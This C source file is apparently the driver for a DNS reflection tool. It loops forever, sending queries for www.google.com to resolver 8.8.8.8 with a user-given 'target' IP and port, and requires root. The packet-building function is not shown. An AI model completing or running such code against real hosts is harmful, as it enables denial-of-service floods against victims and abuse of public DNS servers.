#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/time.h>
#include <time.h>

void dns_send(char *targetIp, int targetPort, char *dnsIp, int dnsPort,
	unsigned char *dnsRecord);

int main(int argc, char **argv)
{	
	// Check the correctness of user input
	if(getuid()!=0)
		printf("You must be running as root!\n");
	if(argc<3)
		printf("Usage: %s targetIp targetPort\n", argv[0]);
	
	// Get target ip and port number
	char *targetIp = argv[1];
	int targetPort = atoi(argv[2]);
	
	while(1) {
		printf("dns send\n");
		dns_send(targetIp, targetPort, "8.8.8.8", 53, "www.google.com");
		sleep(5);
	}	
	return 0;
}
